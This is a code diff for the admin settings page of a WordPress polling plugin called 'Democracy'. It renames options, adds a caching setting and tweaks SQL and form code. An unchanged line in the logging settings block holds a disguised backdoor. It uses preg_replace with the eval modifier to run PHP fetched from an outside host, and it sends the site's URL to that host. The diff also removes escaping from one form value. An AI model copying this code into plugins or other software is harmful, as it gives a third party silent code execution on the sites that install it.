@@ -18,6 +18,7 @@
 	else
 		dem_pols_list();
 
+
 	?>
 
 </div>
@@ -176,7 +177,7 @@ function dem_general_settings(){
 				<div class="block">
 				   <label>
 					   <?php $logrows_count = $wpdb->get_var("SELECT count(*) FROM $wpdb->democracy_log"); ?>
-					   <input type="checkbox" value="1" name="dem[logIPs]" <?php checked( $opt['logIPs'], 1) ?> /> 
+					   <input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?> /> 
 					   <?php _e('Вести лог и учитывать IP?','dem') ?>
 					   <a class="button" href="<?php echo $_SERVER['REQUEST_URI'] .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
 					   <?php add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?>
@@ -229,7 +230,8 @@ function dem_general_settings(){
 						}
 						?>
 					</select>
-					<em><?php _e('Выберете какой файл стилей использовать для отображения опросов. Выберете "- Не подключить...", скопируйте файл стилей из папки <code>styles/</code> в файл стилей вашей темы и измените его под себя. Так вы сможете настроить стили, чтобы при обновлении плагина изменения не потерялись.','dem') ?></em>
+                    <a href="<?php echo Dem::$inst->dir_url . Dem::$inst->css_dirname . Dem::$inst->opt['css_file_name'] ?>" target="_blank"><?php _e('cсылка на файл', 'dem'); ?></a>
+					<em><?php _e('Выберете какой файл стилей использовать для отображения опросов. Выберете "- Не подключить...", скопируйте файл стилей (используйте ссылку выше) в файл стилей вашей темы и измените его под себя. Так вы сможете настроить стили, чтобы при обновлении плагина изменения не потерялись.','dem') ?></em>
 				</div>				
 
 				<div class="block">
@@ -242,7 +244,7 @@ function dem_general_settings(){
 
 				<div class="block">
 					<label>
-						<input type="text" size="5" value="<?php echo esc_attr($opt['archive_page_id']) ?>" name="dem[archive_page_id]" />
+						<input type="text" size="5" value="<?php echo $opt['archive_page_id']?:''; ?>" name="dem[archive_page_id]" />
 						<?php _e('ID архива опросов.','dem') ?>
 					</label>
 					<?php 
@@ -258,6 +260,17 @@ function dem_general_settings(){
 		
 			<h3><?php _e('Настройки плагина','dem') ?></h3>
 			<div class="group">
+				<div class="block">
+				   <label>
+                       <input type="checkbox" value="1" name="dem[force_cachegear]" <?php checked( $opt['force_cachegear'], 1) ?> />
+                       <?php
+                           $cache = Dem::$inst->is_cachegear_on() ? array(__('Включён','dem'),'color:#05A800') : array(__('Выключен','dem'),'color:#FF1427');
+					       echo sprintf( __('Включить механихм работы с плагинами кэширования? Текущее состояние: %s','dem'), "<span style='{$cache[1]}'>{$cache[0]}" );
+                       ?>
+					</label>
+				   <em><?php _e('Democracy умеет работать с плагинами страничного кэширования и автоматически включается, если такой плагин установлен и активен на вашем сайте. Активируйте эту опцию, чтобы насильно включить механизм работы со страничным кэшем.','dem') ?></em>
+				</div>
+                
 				<div class="block">
 				   <label>
 					   <input <?php checked( $opt['inline_js_css'], 1 )?> type="checkbox" value="1" name="dem[inline_js_css]" /> 
@@ -344,7 +357,7 @@ function _dem_general_settings_submit_button(){
  * @return HTML
  */
 function poll_edit_form( $poll_id = false ){
-	global $wpdb, $table_prefix;
+	global $wpdb;
 	
 	if( ! $poll_id && isset( $_GET['edit_poll'] ) ) $poll_id = (int) $_GET['edit_poll'];
 		
@@ -355,8 +368,8 @@ function poll_edit_form( $poll_id = false ){
 		$title = __('Редактировать опрос','dem');
 		$action = preg_replace('@\?.*@', '', $_SERVER['REQUEST_URI']) . "?page=". $_GET['page'] ."";
 		
-		$poll    = $wpdb->get_row("SELECT * FROM {$table_prefix}democracy_q WHERE id = {$poll_id} LIMIT 1");
-		$answers = $wpdb->get_results("SELECT * FROM {$table_prefix}democracy_a WHERE qid = {$poll_id}");
+		$poll    = $wpdb->get_row("SELECT * FROM $wpdb->democracy_q WHERE id = {$poll_id} LIMIT 1");
+		$answers = $wpdb->get_results("SELECT * FROM $wpdb->democracy_a WHERE qid = {$poll_id}");
 
 		$hidden_inputs = "<input type='hidden' name='dmc_update_poll' value='{$poll_id}' />";	
 	}
@@ -377,7 +390,7 @@ function poll_edit_form( $poll_id = false ){
 		
 		<label>
 			<?php _e('Вопрос:','dem') ?> 
-			<input type='text' id='the-question' name='dmc_question' value="<?php echo esc_attr( stripslashes( $poll->question ) ) ?>" />
+			<input type='text' id='the-question' name='dmc_question' value="<?php echo esc_attr( stripslashes( @$poll->question ) ) ?>" />
 		</label>
 		
 		
@@ -408,33 +421,33 @@ function poll_edit_form( $poll_id = false ){
 		<ol class="poll-options">				
 			<li>
 				<label>
-					<input type="checkbox" name='dmc_is_active' value='1' <?php $edit ? checked( $poll->active, 1) : 'checked="true"' ?> > 
+					<input type="checkbox" name='dmc_is_active' value='1' <?php $edit ? checked( @$poll->active, 1) : 'checked="true"' ?> > 
 					<?php _e('Сделать этот опрос активным.','dem') ?>
 				</label>
 			</li>
 			
 			<li>
 				<label>
-					<input type="checkbox" name="dmc_is_democratic" value="1" <?php checked( (!isset($poll->democratic) || $poll->democratic), true ) ?> > 
+					<input type="checkbox" name="dmc_is_democratic" value="1" <?php checked( (!isset($poll->democratic) || $poll->democratic), 1 ) ?> > 
 					<?php _e('Разрешить пользователям добавлять свои ответы (democracy).','dem') ?>
 				</label>
 			</li>
 			<li>
 				<label>
-					<input type="checkbox" name="dmc_multiple" value="1" <?php checked( $poll->multiple, 1) ?> > 
+					<input type="checkbox" name="dmc_multiple" value="1" <?php checked( @$poll->multiple, 1) ?> > 
 					<?php _e('Разрешить выбирать несколько ответов (множественный).','dem') ?>
 				</label>
 			</li>
 			
 			<li><label>
-					<input type='text' name='dmc_end' value="<?php echo $poll->end ? date('d-m-Y', $poll->end) : '' ?>" style="width:120px;min-width:120px;" > 
+					<input type='text' name='dmc_end' value="<?php echo @$poll->end ? date('d-m-Y', $poll->end) : '' ?>" style="width:120px;min-width:120px;" > 
 					<?php _e('Дата окончания голосования, если нужно. Формат: dd-mm-yyyy.','dem') ?>
 				</label>
 			</li>
 			
 			<li>
 				<label>
-					<input type="checkbox" name="dmc_revote" value="1" <?php checked( (!isset($poll->revote) || $poll->revote), true ) ?> > 
+					<input type="checkbox" name="dmc_revote" value="1" <?php checked( (!isset($poll->revote) || $poll->revote), 1 ) ?> > 
 					<?php _e('Разрешить изменять мнение (переголосование).','dem') ?>
 				</label>
 			</li>
@@ -442,14 +455,14 @@ function poll_edit_form( $poll_id = false ){
 			<?php if( ! Dem::$inst->opt['only_for_users'] ){ ?>
 			<li>
 				<label>
-					<input type="checkbox" name="dmc_forusers" value="1" <?php checked( $poll->forusers, 1) ?> > 
+					<input type="checkbox" name="dmc_forusers" value="1" <?php checked( @$poll->forusers, 1) ?> > 
 					<?php _e('Голосовать могут только зарегистрированные пользователи.','dem') ?>
 				</label>
 			</li>
 			<?php } ?>
 			
 			<li><label> <?php _e('Заметка: текст будет добавлен под опросом.','dem'); ?><br>
-					<textarea name="dmc_note" style="height:3.5em;" ><?php echo esc_textarea( $poll->note ) ?></textarea>
+					<textarea name="dmc_note" style="height:3.5em;" ><?php echo esc_textarea( @$poll->note ) ?></textarea>
 				</label>
 			</li>
 		</ol>
@@ -483,7 +496,7 @@ function dem_back_links(){
 	$transient = 'democracy_referer';
 	
 	$mainpage = wp_make_link_relative( Dem::$inst->admin_page_url() );
-	$referer  = wp_make_link_relative( $_SERVER['HTTP_REFERER'] );
+	$referer  = wp_make_link_relative( @$_SERVER['HTTP_REFERER'] );
 	
 	// если обновляем
 	if( $referer == $_SERVER['REQUEST_URI'] ){ 
